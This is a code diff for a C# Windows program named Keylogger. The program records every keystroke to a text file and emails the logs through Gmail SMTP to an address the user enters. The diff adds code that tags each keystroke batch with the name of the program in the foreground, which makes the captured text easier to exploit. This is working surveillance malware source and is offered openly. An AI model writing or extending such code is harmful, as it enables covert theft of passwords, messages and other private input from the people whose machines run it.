@@ -35,6 +35,12 @@ namespace Keylogger
         public static extern int GetAsyncKeyState(Int32 i);
         String emailTo;
 
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll", SetLastError = true)]
+        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+
         private void StartTracking_Click(object sender, RoutedEventArgs e)
         {
             emailTo = emailToSend.Text;
@@ -46,7 +52,7 @@ namespace Keylogger
 
             string pathKeys = (filepath + @"\keystrokes.txt");
             if (!File.Exists(pathKeys))
-                using (StreamWriter sw = File.CreateText(pathKeys));
+                using (StreamWriter sw = File.CreateText(pathKeys)) ;
             string pathProcesses = (filepath + @"\processes.txt");
             if (!File.Exists(pathProcesses))
                 using (StreamWriter sw = File.CreateText(pathProcesses)) ;
@@ -77,6 +83,10 @@ namespace Keylogger
             }, null, startTimeSpan, periodTimeSpan);
 
 
+
+
+
+            uint procId = 0, lastProc = 0;
             while (true)
             {
                 //Thread.Sleep(5);
@@ -87,6 +97,16 @@ namespace Keylogger
                     {
                         using (StreamWriter sw = File.AppendText(pathKeys))
                         {
+                            IntPtr hWnd = GetForegroundWindow();
+                            GetWindowThreadProcessId(hWnd, out procId);
+                            if (procId != lastProc)
+                            {
+                                var proc = Process.GetProcessById((int)procId);
+                                String str = proc.MainModule.ToString().Substring(33);
+
+                                sw.Write("\n" + str + " -> ");
+                                lastProc = procId;
+                            }
                             sw.Write(verifyKey(i));
                             //Console.Write(verifyKey(i));
                         }
@@ -120,7 +140,7 @@ namespace Keylogger
                 SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
                 MailMessage mailMessage = new MailMessage();
 
-                
+
 
                 mailMessage.From = new MailAddress("testkeyloggerapp@gmail.com");
                 mailMessage.To.Add(emailTo);
@@ -190,6 +210,6 @@ namespace Keylogger
 
         }
 
-       
+
     }
 }
